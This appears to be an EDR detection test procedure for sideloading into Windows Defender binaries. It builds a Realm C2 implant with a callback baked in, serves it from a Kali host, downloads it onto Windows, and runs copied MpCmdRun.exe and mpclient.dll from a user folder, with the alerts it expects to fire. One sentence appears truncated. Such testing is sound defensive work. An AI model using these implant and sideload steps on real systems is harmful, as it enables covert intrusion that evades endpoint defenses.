# Test: Evasion — sideload into Windows Defender itself (T1574.002)

**Chain:** Defender's own signed binaries as the sideload host — LockBit's delivery.
`MpCmdRun.exe` copied to a user folder loads a proxy `mpclient.dll` (REvil used
`MsMpEng.exe` + `mpsvc.dll` identically). Your code runs inside a Microsoft-signed
Defender process.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).

variant, build the proxy DLL (see `../dll-sideload/` steps) with `REAL_PATH` pointed at
`C:\Windows\System32\mpclient.dll` and the export list from `dumpbin /exports` of the
genuine DLL, renamed to `mpclient.dll`.

**Victim (elevated PowerShell):** `.\test.ps1` — telemetry-only variant (genuine DLLs, the
*path* is the anomaly):

```powershell
Copy-Item 'C:\Program Files\Windows Defender\MpCmdRun.exe' C:\Users\Public\DefCheck\
Copy-Item 'C:\Program Files\Windows Defender\mpclient.dll'  C:\Users\Public\DefCheck\
Start-Process C:\Users\Public\DefCheck\MpCmdRun.exe -ArgumentList '-Scan','-ScanType','1'
```

**Expected alerts:**

| Rule | Sev | Trigger |
|---|---|---|
| `EVT-DEFENDER-SIDELOAD` | critical | kernel-fed 4688: Defender binary outside its install path (catches fast-exit) |
| `PROC-DEFENDER-SIDELOAD` | critical | WMI poll, same condition |
| `EVT-4688-TEMP` | high | generic user-path launch |

**Verified live** on this machine (the 4688 variant fires even though `MpCmdRun -Scan`
exits in seconds). The same rules cover `NisSrv.exe` and `MsMpEng.exe` hosts.

**Cleanup:** remove `C:\Users\Public\DefCheck`.
